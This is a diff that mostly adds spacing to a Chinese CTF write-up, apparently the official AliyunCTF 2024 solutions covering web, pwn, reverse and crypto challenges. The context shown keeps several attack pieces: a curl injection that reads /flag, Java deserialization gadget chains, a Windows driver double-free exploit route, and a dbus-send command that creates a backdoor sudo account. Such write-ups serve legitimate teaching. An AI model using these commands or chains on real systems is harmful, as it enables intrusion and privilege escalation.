@@ -1,5 +1,5 @@
 ---
-title: 第二届AliyunCTF官方writeup - 先知社区
+title: 第二届 AliyunCTF 官方 writeup - 先知社区
 url: https://xz.aliyun.com/t/14190?time__1311=mqmx9QDQdCqqlpzG77uoAK%3Dhq0xQqD%3D4D
 clipped_at: 2024-03-28 00:01:45
 category: default
@@ -8,13 +8,13 @@ tags:
 ---
 
 
-# 第二届AliyunCTF官方writeup - 先知社区
+# 第二届 AliyunCTF 官方 writeup - 先知社区
 
-# aliyunCTF官方writeup
+# aliyunCTF 官方 writeup
 
 # Web
 
-## web签到
+## web 签到
 
 题目是一个简单的命令参数注入，对于 dig 命令可以用 `-f` 来读取文件
 
@@ -26,21 +26,21 @@ curl -H "Content-Type:application/json" -X POST --data '{"type":"-f/flag", "doma
 
 ### 简介
 
-JDK17 下的两条反序列化链. 一条 hessian, 一条原生. 主要考点是 JDK 17 下 JDK 内部的 sink 不能被反射调用, 需要寻找第三方 sink, 同时还要绕过反序列化黑名单.
+JDK17 下的两条反序列化链。一条 hessian, 一条原生。主要考点是 JDK 17 下 JDK 内部的 sink 不能被反射调用，需要寻找第三方 sink, 同时还要绕过反序列化黑名单。
 
 ### 题目流程
 
-题目包含两个服务器, 第一个是开放了 5000 端口的 springboot 服务器(称为 agent), 第二个是开放了 8080 端口的 springboot 服务器(称为server). 只有 agent 对外部访问者开放, 所以参赛者需要先 RCE agent, 再通过 agent 访问 server, 最后 RCE server 读取 flag.
+题目包含两个服务器，第一个是开放了 5000 端口的 springboot 服务器 (称为 agent), 第二个是开放了 8080 端口的 springboot 服务器 (称为 server). 只有 agent 对外部访问者开放，所以参赛者需要先 RCE agent, 再通过 agent 访问 server, 最后 RCE server 读取 flag.
 
 ### agent
 
-agent 端提供了一个 hessian 反序列化的入口, 和一个 getter 可以二次反序列化的 Bean 类作为 gadget, 同时启动选项里开放了 atomic 模块:
+agent 端提供了一个 hessian 反序列化的入口，和一个 getter 可以二次反序列化的 Bean 类作为 gadget, 同时启动选项里开放了 atomic 模块：
 
 ```plain
 CMD ["java", "--add-opens", "java.base/java.util.concurrent.atomic=ALL-UNNAMED", "-jar", "/opt/agent/agent-0.0.1-SNAPSHOT.jar"]
 ```
 
-题目在 springboot 环境下, pom.xml 文件里可以看到依赖包含 hutool, h2:
+题目在 springboot 环境下，pom.xml 文件里可以看到依赖包含 hutool, h2:
 
 ```plain
 <dependency>
@@ -56,7 +56,7 @@ CMD ["java", "--add-opens", "java.base/java.util.concurrent.atomic=ALL-UNNAMED",
 </dependency>
 ```
 
-使用如下 hessian 反序列化链触发 H2 SQL 执行:
+使用如下 hessian 反序列化链触发 H2 SQL 执行：
 
 ```plain
 JSONObject.put -> AtomicReference.toString -> POJONode.toString -> Bean.getObject -> DSFactory.getDataSource -> Driver.connect
@@ -147,7 +147,7 @@ call send('http://server:8080/read', '<这里填打 server 的 base64 payload>')
 
 ### server
 
-server 端提供了一个原生反序列化入口. 题目环境在 springboot 下, 在pom.xml 文件里可以看到依赖包含 jooq:
+server 端提供了一个原生反序列化入口。题目环境在 springboot 下，在 pom.xml 文件里可以看到依赖包含 jooq:
 
 ```plain
 <dependency>
@@ -157,7 +157,7 @@ server 端提供了一个原生反序列化入口. 题目环境在 springboot �
 </dependency>
 ```
 
-使用如下原生反序列化链触发 SpEL 表达式执行:
+使用如下原生反序列化链触发 SpEL 表达式执行：
 
 ```plain
 EventListenerList.readObject -> POJONode.toString -> ConvertedVal.getValue -> ClassPathXmlApplicationContext.<init>
@@ -255,7 +255,7 @@ public class PocServer {
 
 ## Pastbin
 
-可以通过竞争 /flag 与 /about 获取到 FLAG ，有多种并发方式，以下提供一种使用 python 的执行并发的方式，仅供参考，后续会提供详细分析的 writeup放在评论区
+可以通过竞争 /flag 与 /about 获取到 FLAG，有多种并发方式，以下提供一种使用 python 的执行并发的方式，仅供参考，后续会提供详细分析的 writeup 放在评论区
 
 ```plain
 import asyncio
@@ -403,9 +403,9 @@ select * from org.apereo.cas.util.cipher.WebConflowConversationStateCipherExecut
 
 # Pwn
 
-## pwn签到
+## pwn 签到
 
-利用add函数从unsortbin当初切割一个chunk，且保留了libc地址，将其泄露获取libc。 通过输入flag进入有漏洞的scanf函数进行栈溢出。
+利用 add 函数从 unsortbin 当初切割一个 chunk，且保留了 libc 地址，将其泄露获取 libc。通过输入 flag 进入有漏洞的 scanf 函数进行栈溢出。
 
 ```plain
 #coding=utf-8
@@ -684,11 +684,11 @@ let fake1 = {c:1.1, d:2.2};let fake2 = {c:1.1, d:{}};fake2[0] = 1.1;fake2[1] = 1
 
 ## klang
 
-题目实现了一个非常简单的编译器，其中存在许多bug。
+题目实现了一个非常简单的编译器，其中存在许多 bug。
 
 ### 预期解法
 
-通过阅读代码生成的寄存器分配部分可以发现其中的逻辑非常不合理：替换虚拟寄存器时若遇到Spill的情况只将Live interval后半段替换为Spill slot。这样会导致程序控制流在存在backedge的情况下出现错误。利用这个bug可以将array和string类型的变量进行混淆。
+通过阅读代码生成的寄存器分配部分可以发现其中的逻辑非常不合理：替换虚拟寄存器时若遇到 Spill 的情况只将 Live interval 后半段替换为 Spill slot。这样会导致程序控制流在存在 backedge 的情况下出现错误。利用这个 bug 可以将 array 和 string 类型的变量进行混淆。
 
 #### exploit
 
@@ -822,8 +822,8 @@ p.interactive()
 
 ### 非预期解法
 
-1.  在IR优化中的DCE部分，对于Call, CallVoid, ArrayStore IR的处理存在问题：由于该指令并非BB中的Terminator，如果该IR的后面其使用的寄存器被再次赋值，会导致其之前的Assign IR被错误的消除掉。利用该bug可以消除掉函数开头的初始化操作。
-2.  在IR生成部分存在bug：对于do-while中出现return语句的情况没有进行正确的处理，导致ret指令可以出现在BB中间。利用该bug可以跳至程序中任意地址。
+1.  在 IR 优化中的 DCE 部分，对于 Call, CallVoid, ArrayStore IR 的处理存在问题：由于该指令并非 BB 中的 Terminator，如果该 IR 的后面其使用的寄存器被再次赋值，会导致其之前的 Assign IR 被错误的消除掉。利用该 bug 可以消除掉函数开头的初始化操作。
+2.  在 IR 生成部分存在 bug：对于 do-while 中出现 return 语句的情况没有进行正确的处理，导致 ret 指令可以出现在 BB 中间。利用该 bug 可以跳至程序中任意地址。
 
 ## netatalk
 
@@ -1271,14 +1271,14 @@ the `afputils.py`library is required for it.
 
 ## SYSTEM
 
-SYSTEM是一个Windows第三方驱动的提权题目，有漏洞的驱动通过DeviceIoControl向用户态分别提供了64位和32位下的申请内存并映射到用户态以及释放映射和释放内存的功能。  
-题目漏洞比较明显，在两个释放的处理逻辑中都没有将指针置空，连续释放两次既发生double free。如果是一个同样逻辑的Linux Kernel题目，在当今内卷的CTF背景下恐怕只能是baby或者easy级别的题目了，这里虽然平台换成了Windows，但基本思想一致，同样是将double free转化为特定对象的UAF，构造更强的原语完成利用。
+SYSTEM 是一个 Windows 第三方驱动的提权题目，有漏洞的驱动通过 DeviceIoControl 向用户态分别提供了 64 位和 32 位下的申请内存并映射到用户态以及释放映射和释放内存的功能。  
+题目漏洞比较明显，在两个释放的处理逻辑中都没有将指针置空，连续释放两次既发生 double free。如果是一个同样逻辑的 Linux Kernel 题目，在当今内卷的 CTF 背景下恐怕只能是 baby 或者 easy 级别的题目了，这里虽然平台换成了 Windows，但基本思想一致，同样是将 double free 转化为特定对象的 UAF，构造更强的原语完成利用。
 
-这里发生double free的对象是[MDL](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_mdl)，属于Non Paged Pool，作者选用的堆喷对象是[NpFr(named pipe)](https://github.com/vportal/HEVD?tab=readme-ov-file#exploitation-strategy)和[IoSb(IopVerifierExAllocatePoolWithQuota)](https://www.anquanke.com/post/id/255916#h3-8)来占位Ws2P(ws2ifsl)，在关闭ws2ifsl的handle时可以造成一个arbitrary decrement，通过修改[\_KTHREAD.PreviousMode](https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis)构造读写原语完成利用。
+这里发生 double free 的对象是[MDL](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_mdl)，属于 Non Paged Pool，作者选用的堆喷对象是[NpFr(named pipe)](https://github.com/vportal/HEVD?tab=readme-ov-file#exploitation-strategy)和[IoSb(IopVerifierExAllocatePoolWithQuota)](https://www.anquanke.com/post/id/255916#h3-8)来占位 Ws2P(ws2ifsl)，在关闭 ws2ifsl 的 handle 时可以造成一个 arbitrary decrement，通过修改[\_KTHREAD.PreviousMode](https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis)构造读写原语完成利用。
 
-当然可行的利用方法不唯一，比如赛中唯一解出这道题目的Nu1L使用的是clfs的对象进行的堆喷占位。
+当然可行的利用方法不唯一，比如赛中唯一解出这道题目的 Nu1L 使用的是 clfs 的对象进行的堆喷占位。
 
-这道题目的唯一坑点可能是64位程序在调用IOCTL\_ALLOCATE32时会因为integer truncation发生无效地址访问导致蓝屏：
+这道题目的唯一坑点可能是 64 位程序在调用 IOCTL\_ALLOCATE32 时会因为 integer truncation 发生无效地址访问导致蓝屏：
 
 ```plain
 #define IOCTL_ALLOCATE32 \
@@ -1293,19 +1293,19 @@ SYSTEM是一个Windows第三方驱动的提权题目，有漏洞的驱动通过D
             RtlFillMemory((PVOID)MappedBuffer, BufferSize, 0xFF);
 ```
 
-因为这里设计是给32位程序使用的回调，64位程序的用户态地址在发生integer truncation后往往是非法地址，预期是通过一个32位的程序完成利用，但最终来看只给Nu1L一个队伍增加了一点难度:p
+因为这里设计是给 32 位程序使用的回调，64 位程序的用户态地址在发生 integer truncation 后往往是非法地址，预期是通过一个 32 位的程序完成利用，但最终来看只给 Nu1L 一个队伍增加了一点难度:p
 
-ps1: 在当前Windows 11系统（Build版本号为22621）中，Medium Integrity的用户仍然可以读取内核地址，同时PreviousMode的方法仍然可以使用，如果有选手想要复现这道题目请注意系统版本，题目附件可以从[SYSTEM\_70812a289a4097da53b89a5f8905018964b87aac5c2ff3921deb9797535bbf75622a2a67e7f0adfaf83155b3849158a03810bc239eb95e9694fbf8a3497d1cad.zip](https://1drv.ms/u/s!An3IrMK1dZVygfwbN_5_N4tWqwF2pw?e=jM6Np3)下载，作者的exploit可以从[poc.zip](https://1drv.ms/u/s!An3IrMK1dZVygfxk91yMqnVsUxrVfQ?e=YFRevK)下载
+ps1: 在当前 Windows 11 系统（Build 版本号为 22621）中，Medium Integrity 的用户仍然可以读取内核地址，同时 PreviousMode 的方法仍然可以使用，如果有选手想要复现这道题目请注意系统版本，题目附件可以从[SYSTEM\_70812a289a4097da53b89a5f8905018964b87aac5c2ff3921deb9797535bbf75622a2a67e7f0adfaf83155b3849158a03810bc239eb95e9694fbf8a3497d1cad.zip](https://1drv.ms/u/s!An3IrMK1dZVygfwbN_5_N4tWqwF2pw?e=jM6Np3)下载，作者的 exploit 可以从[poc.zip](https://1drv.ms/u/s!An3IrMK1dZVygfxk91yMqnVsUxrVfQ?e=YFRevK)下载
 
 ## alibus
 
 题目是一个简单的 dbus 服务配置导致不当导致可以提权的场景
 
-可以看到这个dbus配置，允许在没有授权的情况下接受连接，并允许客户端 "own" any service
+可以看到这个 dbus 配置，允许在没有授权的情况下接受连接，并允许客户端 "own" any service
 
-利用思路如下:
+利用思路如下：
 
-1.编写一个自己的一个 dbus 服务, 实现 CheckAuthorization 函数
+1.编写一个自己的一个 dbus 服务，实现 CheckAuthorization 函数
 
 ```plain
 from gi.repository import GLib
@@ -1341,17 +1341,17 @@ if __name__ == '__main__':
     mainloop.run()
 ```
 
-2.连接服务, 并使用
+2.连接服务，并使用
 
 ```plain
 dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hack string:"" int32:1
 ```
 
-命令创建一个后门帐号, 由于我们实现了一个自己的 org.freedesktop.PolicyKit1.Authority 的 CheckAuthorization, 因此我们可以操作任意的 policykit-1 方法, 我们可以用 createUser 创建帐号, 用 Accounts.User.SetPassword 修改密码.
+命令创建一个后门帐号，由于我们实现了一个自己的 org.freedesktop.PolicyKit1.Authority 的 CheckAuthorization, 因此我们可以操作任意的 policykit-1 方法，我们可以用 createUser 创建帐号，用 Accounts.User.SetPassword 修改密码。
 
 此时的这个 hack 用户可以拥有 sudo 权限
 
-3.切到 hack 用户, 并且使用密码切到 root 账号
+3.切到 hack 用户，并且使用密码切到 root 账号
 
 # Reverse
 
@@ -1359,7 +1359,7 @@ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-re
 
 程序中的问题可以转化为，求一个图中的欧拉路径问题，首先分析邻接表，由邻接表可知无向图中有两个结点的度为奇数，其他结点的度均为偶数，所以该图存在欧拉路，但是不存在欧拉回路，且欧拉路的起点，和终点一定分别为度为奇数的两个结点，即 0 结点，或者 4 结点。
 
-由之前的约束条件可以知道，输入的数据中最后一个为 4 所以，结点 4 是作为终点。那结点 0 即为起点，所以输入的第一个数字为 0 ，在后面编写脚本搜索时我们也使用 0 作为起点去搜索。
+由之前的约束条件可以知道，输入的数据中最后一个为 4 所以，结点 4 是作为终点。那结点 0 即为起点，所以输入的第一个数字为 0，在后面编写脚本搜索时我们也使用 0 作为起点去搜索。
 
 使用 DFS 的方法搜索所有欧拉路径，且根据约束条件过滤，不符合要求的欧拉路径
 
@@ -1398,19 +1398,19 @@ def findeuler(m, cur, vis, record, cnt):
              if graph[i][j] == 1:
                  v += 1
      v //= 2
-     vis = np.random.randint(0,1,81).reshape((9,9)) #vis矩阵用来判断该条边是否被走过,初始状态下全为0
+     vis = np.random.randint(0,1,81).reshape((9,9)) #vis 矩阵用来判断该条边是否被走过，初始状态下全为 0
      record = np.random.randint(0, 1, v * 2)
-     record[0] = 0 #设置起点为0号结点
+     record[0] = 0 #设置起点为 0 号结点
      findeuler(graph, 0, vis, record, 1)
 ```
 
 ## \-ENOTYOURWORLD
 
-因题目复杂，出题人初步公开[题目源代码](https://github.com/Riatre/aliyunctf-2024-challenges-public/tree/main/-enotyourworld)。后续具体writeup完成后会通过链接放在评论区。
+因题目复杂，出题人初步公开[题目源代码](https://github.com/Riatre/aliyunctf-2024-challenges-public/tree/main/-enotyourworld)。后续具体 writeup 完成后会通过链接放在评论区。
 
 ## mi
 
-因题目复杂，出题人初步公开[题目源代码](https://github.com/Riatre/aliyunctf-2024-challenges-public/tree/main/mi)。后续具体writeup完成后会通过链接放在评论区。
+因题目复杂，出题人初步公开[题目源代码](https://github.com/Riatre/aliyunctf-2024-challenges-public/tree/main/mi)。后续具体 writeup 完成后会通过链接放在评论区。
 
 ## RDTMA
 
@@ -1439,7 +1439,7 @@ def findeuler(m, cur, vis, record, cnt):
 1.  `sub_143A` 里找的 device 是 `dev[i]->sysfs->driver_id` 为 14 且 `->abi_version` 为 2 的。查 `rdma/ib_user_ioctl_verbs.h` 可知这个值是 `RDMA_DRIVER_RXE`。据此可以配出运行程序的环境。
 2.  `sub_1628` 里程序首先构造了一些长得像 `ibv_send_wr` 但是尾部又多出来点东西的结构，传给了 `sub_47F6`。
 3.  `sub_47F6` 将这个根据多出来的东西选择性地修改了前面的 `ibv_send_wr` 里的一些字段，主要是一些 `write.remote_addr` 和 `atomic.compare_add` 之类的。
-4.  `sub_47F6` 里直接操作了 `qp->sq.queue` 里的一些字段，查阅 rdma-core 源码可知这个结构体指向的就直接是内核映射到用户态的 WQ 区域 （定义见内核头文件 `rdma/rdma_user_rxe.h`）：
+4.  `sub_47F6` 里直接操作了 `qp->sq.queue` 里的一些字段，查阅 rdma-core 源码可知这个结构体指向的就直接是内核映射到用户态的 WQ 区域（定义见内核头文件 `rdma/rdma_user_rxe.h`）：
 
 ```plain
 /* This data structure is stored at the base of work and
@@ -1480,48 +1480,48 @@ struct rxe_queue_buf {
 
 ### Omake
 
-本题的灵感来自 NSDI'22 上的一篇工作 [RedN](https://www.usenix.org/conference/nsdi22/presentation/reda)，这篇工作利用 Mellanox 的 ConnectX-5 支持的一些非标 op （主要是 Cross Channel 相关的），配合对 Send Queue 里的 Work Request 的自修改，愣是制造出了让网卡自己跑循环和条件跳转的功能。  
-那么我们能不能在里面构造逻辑对 flag 做变换、比较呢？利用原作者放出的代码，很容易便可以实现这样的一个题目，最难的部分大概是装一个 MLNX\_OFED 4.x （5.x 以后切换到了跟上游同步的 rdma-core 实现，废弃了原本的 ibv*exp*\* 开头的大量 Mellanox 独有 verb）。
+本题的灵感来自 NSDI'22 上的一篇工作 [RedN](https://www.usenix.org/conference/nsdi22/presentation/reda)，这篇工作利用 Mellanox 的 ConnectX-5 支持的一些非标 op（主要是 Cross Channel 相关的），配合对 Send Queue 里的 Work Request 的自修改，愣是制造出了让网卡自己跑循环和条件跳转的功能。  
+那么我们能不能在里面构造逻辑对 flag 做变换、比较呢？利用原作者放出的代码，很容易便可以实现这样的一个题目，最难的部分大概是装一个 MLNX\_OFED 4.x（5.x 以后切换到了跟上游同步的 rdma-core 实现，废弃了原本的 ibv*exp*\* 开头的大量 Mellanox 独有 verb）。
 
 然而，这样的题目会非常坑爹：想要运行 / 调试题目 binary，必须手上得先有一块 mlx5 驱动支持的网卡。虽然我们实测 ConnectX-4 就可以，CX-4 在二手市场上目前的售价甚至只要不到两百块，这样的门槛出现在 CTF 题目里还是很不友好。因此题目实际上探索了另一个问题：只考虑 Linux 内核自带的 Soft RoCEv2 实现，如果不用这些非标 verb，还能实现类似的功能吗？能实现到什么程度？
 
 结论是：能，但不太能。我们并没有等价于 `WAIT` 的能力，从而没法“正确”地控制顺序。
 
-此外，由于时间仓促，题目没有静态连接 libibverbs （本意是避免选手对库的代码进行无意义的逆向，但这个目的也可以通过部分 strip 实现），但依赖了库内部的一些结构体的 layout（我们对最近的 7 个大版本进行了测试，这部分均没改），在题目刚放出时也没有对依赖的 rdma-core 版本进行说明，导致有选手使用较旧的 rdma-core 调试时遇到了不必要的麻烦。希望没有对选手们造成太大困扰。
+此外，由于时间仓促，题目没有静态连接 libibverbs（本意是避免选手对库的代码进行无意义的逆向，但这个目的也可以通过部分 strip 实现），但依赖了库内部的一些结构体的 layout（我们对最近的 7 个大版本进行了测试，这部分均没改），在题目刚放出时也没有对依赖的 rdma-core 版本进行说明，导致有选手使用较旧的 rdma-core 调试时遇到了不必要的麻烦。希望没有对选手们造成太大困扰。
 
 # Crypto
 
 ## BabyDH 1
 
-本题主要考查选手阅读论文能力、编程能力，要求选手对于格归约算法、Coppersmith方法有一定了解。
+本题主要考查选手阅读论文能力、编程能力，要求选手对于格归约算法、Coppersmith 方法有一定了解。
 
 ### 题目描述
 
-题目中服务端模拟Alice与Bob两方进行了一次DH密钥交换，我们获得了他们的公钥。随后我们可以作为第三方与Alice进行一次DH交换，同时提供了一个额外的Oracle，可以泄露出我们与Alice协商出来的点x坐标和y坐标的低比特位数值。我们需要还原出该点的完整坐标值。
+题目中服务端模拟 Alice 与 Bob 两方进行了一次 DH 密钥交换，我们获得了他们的公钥。随后我们可以作为第三方与 Alice 进行一次 DH 交换，同时提供了一个额外的 Oracle，可以泄露出我们与 Alice 协商出来的点 x 坐标和 y 坐标的低比特位数值。我们需要还原出该点的完整坐标值。
 
 ### 求解思路
 
 根据题目中的信息，我们可以构造多项式$$f(x,y)=(My+y')^2-((Mx+x')^3+a(Mx+x')+b)$$，其中$x',y'$是泄露出来的数值，而$M=2^{211}$。
 
-使用Coppersmith方法求解该多项式的小数根，预期解法是基于Jochemsz和May提出的[构造](https://link.springer.com/chapter/10.1007/11935230_18)进行调整。但事实上，已经有相关场景下的[研究](https://link.springer.com/chapter/10.1007/978-3-031-19685-0_6)发表，故只需要根据文中构造复现即可解出本题。
+使用 Coppersmith 方法求解该多项式的小数根，预期解法是基于 Jochemsz 和 May 提出的[构造](https://link.springer.com/chapter/10.1007/11935230_18)进行调整。但事实上，已经有相关场景下的[研究](https://link.springer.com/chapter/10.1007/978-3-031-19685-0_6)发表，故只需要根据文中构造复现即可解出本题。
 
-注意到本题的限时较短，考虑使用[flatter](https://github.com/keeganryan/flatter)工具完成快速格归约。实测发现设置参数本题中取m = 7，t = 1，在1核的Ubuntu虚拟机上耗时约25s有概率完成求解。
+注意到本题的限时较短，考虑使用[flatter](https://github.com/keeganryan/flatter)工具完成快速格归约。实测发现设置参数本题中取 m = 7，t = 1，在 1 核的 Ubuntu 虚拟机上耗时约 25s 有概率完成求解。
 
 ## BabyDH 2
 
-本题主要考查选手阅读论文能力、编程能力，要求选手对于格归约算法、Coppersmith方法有一定了解。
+本题主要考查选手阅读论文能力、编程能力，要求选手对于格归约算法、Coppersmith 方法有一定了解。
 
 ### 题目描述
 
-题目中服务端模拟Alice与Bob两方进行了一次DH密钥交换，随后我们可以作为第三方与Alice进行DH交换，同时提供了一个可以多次访问的额外Oracle，可以泄露出我们与Alice协商出来的点x坐标的低比特位数值。我们需要恢复出Alice与Bob协商出的共享密钥。
+题目中服务端模拟 Alice 与 Bob 两方进行了一次 DH 密钥交换，随后我们可以作为第三方与 Alice 进行 DH 交换，同时提供了一个可以多次访问的额外 Oracle，可以泄露出我们与 Alice 协商出来的点 x 坐标的低比特位数值。我们需要恢复出 Alice 与 Bob 协商出的共享密钥。
 
 ### 求解思路
 
 本题中的场景相当于求解椭圆曲线隐藏数问题（[ECHNP](https://iacr.org/archive/asiacrypt2001/22480036.pdf)）。
 
-选手需要编程复现发表于[2022年亚密会](https://eprint.iacr.org/2022/1239.pdf)的研究成果，注意原论文中考虑的是高比特泄露的场景，因此求解本题的格构造需要做出一定修改。
+选手需要编程复现发表于[2022 年亚密会](https://eprint.iacr.org/2022/1239.pdf)的研究成果，注意原论文中考虑的是高比特泄露的场景，因此求解本题的格构造需要做出一定修改。
 
-注意到本题的限时较短，考虑使用[flatter](https://github.com/keeganryan/flatter)工具完成快速格归约。实测发现设置参数n = 5，d = 3，t = 2，在1核的Ubuntu虚拟机上耗时约18s即可完成求解。
+注意到本题的限时较短，考虑使用[flatter](https://github.com/keeganryan/flatter)工具完成快速格归约。实测发现设置参数 n = 5，d = 3，t = 2，在 1 核的 Ubuntu 虚拟机上耗时约 18s 即可完成求解。
 
 ## Doctored Dobbertin v2
 
@@ -1529,16 +1529,16 @@ struct rxe_queue_buf {
 
 ### 题目描述
 
-题目中实现了一个10轮可调AES算法，即加密函数的输入除了明文以及密钥外，还有一个额外的输入称作tweak。
+题目中实现了一个 10 轮可调 AES 算法，即加密函数的输入除了明文以及密钥外，还有一个额外的输入称作 tweak。
 
-服务端随机生成密钥、明文、tweak，随后进行一次加密作为挑战，接着客户端可以选取明文、tweak获取相同密钥的加密结果，接着服务端公布挑战密文和所用到的tweak，客户端需要恢复明文，即可获取flag。
+服务端随机生成密钥、明文、tweak，随后进行一次加密作为挑战，接着客户端可以选取明文、tweak 获取相同密钥的加密结果，接着服务端公布挑战密文和所用到的 tweak，客户端需要恢复明文，即可获取 flag。
 
 ### 求解思路
 
-通过比对，不难发现，与hacklu CTF 2023中的原题“Doctored Dobbertin”相比，本题中修改的常量包含S盒、P盒以及常数，而选择明文攻击的次数由7次减少为1次。常规的线性、差分等手段往往需要更多数据，因此考虑其他特殊方法。
+通过比对，不难发现，与 hacklu CTF 2023 中的原题“Doctored Dobbertin”相比，本题中修改的常量包含 S 盒、P 盒以及常数，而选择明文攻击的次数由 7 次减少为 1 次。常规的线性、差分等手段往往需要更多数据，因此考虑其他特殊方法。
 
-如果搜索“可调分组密码后门”，可以发现[相关论文](https://eprint.iacr.org/2021/829.pdf)，而本题的攻击方法取自第5节。  
-当然求解本题并非必须阅读原论文，有经验的选手会发现题目轮常数的修改显得非常可疑：每一轮加密中，会将常数以及tweak分别加到内部状态上，那是否存在一个tweak，其满足每一轮派生出来的轮tweak与轮常数相加后刚好抵消？答案是肯定的，经过分析，可以找出来该tweak数值为`0x846a51a2787d09d057b2bfa8a3481dae`。接着，我们只需要发送全0的明文，最后一次轮密钥加之前，我们知道内部密文的第1/3列必然相等，2/4列必然相等，而最后一轮的轮密钥恰好有一半为0，因此我们可以提取出8个非0密钥字节，进而可以确定主密钥中的8个字节，最后只需要枚举主密钥剩下的2字节即可。
+如果搜索“可调分组密码后门”，可以发现[相关论文](https://eprint.iacr.org/2021/829.pdf)，而本题的攻击方法取自第 5 节。  
+当然求解本题并非必须阅读原论文，有经验的选手会发现题目轮常数的修改显得非常可疑：每一轮加密中，会将常数以及 tweak 分别加到内部状态上，那是否存在一个 tweak，其满足每一轮派生出来的轮 tweak 与轮常数相加后刚好抵消？答案是肯定的，经过分析，可以找出来该 tweak 数值为`0x846a51a2787d09d057b2bfa8a3481dae`。接着，我们只需要发送全 0 的明文，最后一次轮密钥加之前，我们知道内部密文的第 1/3 列必然相等，2/4 列必然相等，而最后一轮的轮密钥恰好有一半为 0，因此我们可以提取出 8 个非 0 密钥字节，进而可以确定主密钥中的 8 个字节，最后只需要枚举主密钥剩下的 2 字节即可。
 
 ## 又双叒叕
 
@@ -1809,20 +1809,20 @@ print(msg)
 
 ## 帕鲁情绪管理
 
-本题由于样本集过小（总数据量1.5w左右）。选手也可以通过大量轮询方法获取所有的数据集进行直接枚举，不过这种方法将会耗费大量时间，不推荐。
+本题由于样本集过小（总数据量 1.5w 左右）。选手也可以通过大量轮询方法获取所有的数据集进行直接枚举，不过这种方法将会耗费大量时间，不推荐。
 
-如果是随机猜测语句情绪的话，则可能性在pow(1/3, 15) ≈ 0.00000006，几乎不可能做到。
+如果是随机猜测语句情绪的话，则可能性在 pow(1/3, 15) ≈ 0.00000006，几乎不可能做到。
 
 推荐的做法如下：
 
-1.  准备数据集：将提供的40条数据按照格式进行解析，提取出 sentiment 和 text。将其划分为训练集。
+1.  准备数据集：将提供的 40 条数据按照格式进行解析，提取出 sentiment 和 text。将其划分为训练集。
 2.  特征提取：对文本进行特征提取，一种常用的方法是使用词袋模型。将文本转换为向量表示，统计文本中每个词语在该文本中出现的次数或使用其他统计特征表示。
 3.  计算类别的先验概率：根据训练集中的 sentiment，统计每个类别的先验概率。
 4.  计算特征的条件概率：对于每个特征（词语），计算在给定类别下的条件概率。可以使用词频或其他统计方法来估计条件概率。
 5.  进行分类预测：对于测试集中的每个样本，根据贝叶斯定理和条件独立性假设计算后验概率，并选择具有最高后验概率的类别作为预测结果。
 6.  错误重试：当预测失败后，旧的数据集仍作为下一次连接的基础训练集，这样即可获取更多的样本数量。
 
-最终的wp如下：
+最终的 wp 如下：
 
 ```plain
 import re
